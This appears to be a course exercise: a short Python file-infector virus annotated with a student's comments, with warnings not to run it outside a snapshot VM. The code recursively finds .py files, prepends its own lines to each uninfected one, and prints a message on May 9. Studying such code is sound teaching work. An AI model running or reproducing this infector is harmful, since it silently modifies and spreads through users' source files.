## Copy the below Python script to your public GitHub repo. Do not execute this script in your Ubuntu VM used for class. If you wish to execute this script, either backup your VM using VirtualBox Snapshot or create a separate VM for testing.
## do not execute this code

#!/usr/bin/python3
import os
import datetime ## just importing the module/library

SIGNATURE = "VIRUS"

def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break ## seems to be checking if the file is already infected.. does the code actually label them as infected? or is this just an example where viruses would add a set of characters to identify if they've been infected????
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = "" ## this is where the virus seems to start taking action, infecting the file list that has been verified as non-infected
    for i,line in enumerate(virus):
        if 0 <= i < 39:  #apparently it wants to use the first 39 lines, who at the front I don't know... It seems like it may be of more value to do it later in the documents/files, but maybe it wants to ensure that all files/docs get infected and not miss some due to length??
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def detonate(): ## this seems to be setting the timeline for the virus to be executed. once it hits the below times it will 'detonate' as defined. 
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: ## apparently the author has a thing for may 9th, I tried doing a search for any significance and I was unable to find any after a quick search...
        print("You have been hacked")

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()
